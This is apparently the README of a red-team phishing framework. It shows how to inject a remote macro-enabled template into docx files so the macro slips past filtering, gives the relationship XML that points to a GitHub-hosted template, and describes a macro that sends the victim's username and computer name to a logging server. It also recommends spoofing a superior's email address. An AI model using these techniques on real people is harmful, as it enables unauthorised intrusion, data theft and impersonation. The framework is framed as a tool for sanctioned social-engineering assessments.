# TPP (The Phishing Project)

The purpose of this repository is to distribute an easy to use framework for doing in-depth, customizable, company wide phishing that use real attacker tactics.

Within you will find example documents and disarmed Word docs that all succeeded in logging the data of a compromised machine via phishing. 

![database results](/img/db.png "Database results")

The tech details are deeper in, but none of this is real 'malware'. At worst, it is the crappiest spyware ever developed because it logs a Windows OS's User and Computer Name.

The importance of writing a [quality report](/Report.pdf) (you can write a better intro than that) with the data after the fact cannot be understated. Learning where you are weak is fun and valuable, but explaining it in a way that management can understand is how change occurs. There is a redacted report from a real engagement that should be read, each portion is worth including. Keeping it short keeps it readable.

## Tech Details

Most networks block .docm and .doc files because they can contain macros which is considered unsafe. Unfortunately, docx files are also unsafe because they have the ability to execute macros. This framework makes use of macro enabled template injection to bypass this. There is plenty of reading available on this topic [here](http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html), and [here](https://0xevilc0de.com/maldoc-uses-template-injection-for-macro-execution/). The short of it is we can "embed" a macro which is downloaded upon the docx being opened. The full macro that was used is available [here](/src/macro.txt). This has the advantage of being able to arm and disarm the document by modifying the privacy of wherever the template is hosted. I went ahead and hosted my templates on Github.

How the attack works is when a user clicks "Enable Contents", their username and computer name are retrieved, then sent via $\_GET to a domain that is waiting with a basic PHP script to handle the request, which then logs it in a database. There is SQL that will generate the table and fields for you, and both necessary PHP scripts are in src as well.

## Installation

This process will take about an hour if you have all prerequisite knowledge, 3 if you're learning as you go.

Step 0: Ensure that you have a (paid) domain and hosting, both will be useful. You should be comfortable with basic web administration, creating a database, and uploading files to a server. You will also need an up to date Microsoft Word.

First you should set up the database and PHP scripts and ensure they can interact with a simple http://my_domain.com/process_macro.php?deadbeef[]=hi&deadbeef[]=greetings. If hi and greetings are recorded in the database, you are ready to begin playing with Word docs. If not, make sure everything is pointing to the right place. You will need to modify helper2.php as it contains the database login information. You should not need to modify process_macro.php but it should pose no trouble as long as you are careful.

The documents themselves need to be crafted carefully. The macro is flexible if you are comfortable modifying VBA, but otherwise should be left as is (with the exception of the link to your domain). A malicious document can be created by making a new Word document, and instead of selecting Blank page, choose a template. I like the Resume templates because they are easy to modify and have a nice background. What this is doing behind the scenes is creating a file called settings.xml.rels which stores a link to the template. This will later be changed to a URL hosting our payload. Make whatever social engineering changes you are going to make to the document while keeping the template, there are examples [here](/Emails%20&%20Documents/). Once you're done modifying what our victims will see (only use information that a real attacker would have), its time to inject. 

Create an empty Word document and save it as a .dotm. Go into the Developer tab and open up the macro editor. You can copy and paste macro.txt in there (modifying the link). Be sure that you save the macro in This Document (not always the default). You need to find a good place to host this document online. If using Github, give the full link to the file directly.

There is a script that automates this process [here](https://github.com/JohnWoodman/remoteinjector), but the process is trivial to do manually (see links above talking about macro enabled template injection). The link you use when injecting matters. If using Github, you'll need to add ?raw=true to the end of the link so that it pulls the contents correctly. Example below,
```
<?xml version="1.0" ?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Target="https://github.com/dillon9/Template/blob/main/template.dotm" TargetMode="External" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"/>
</Relationships>
```
Becomes,
```
<?xml version="1.0" ?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Target="https://github.com/dillon9/Template/blob/main/template.dotm?raw=true" TargetMode="External" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"/>
</Relationships>
```
You should now be able to test that your docx file will open, download the macro, and send data back to your database. If you have issues at this point, review that you have set up everything correctly. If issues persist, raise an issue and I will look at it when I have some free time.

## Spoofing

There are several choices out there, but [SET](https://github.com/trustedsec/social-engineer-toolkit/) and [Zaqar](https://github.com/TobinShields/Zaqar_EmailSpoofer) appear to be the easiest, and most functional. There are pros and cons to both, do your own research, but spoofing will greatly increase the success of your campaign. Every single document that met success used the spoofed email address of a superior.

Zaqar is easier to set up and will run on your server so no additional installation/setup required. SET runs best on Kali and is picky if you make a typo. SET however does support multiple emails at once which can save a massive amount of time.

If choosing SET, you will need to set up a mail server. smtp2go is a fine choice, it is free and allows 1,000 emails per day.

## Legal

The legality of spoofing emails and sending malicious documents is dubious at best. If there is any doubt about whether or not you are allowed to be doing this, don't. The CFAA is no joke. This framework is only available for use in a legally sanctioned social engineering engagement, pentest, or for research.





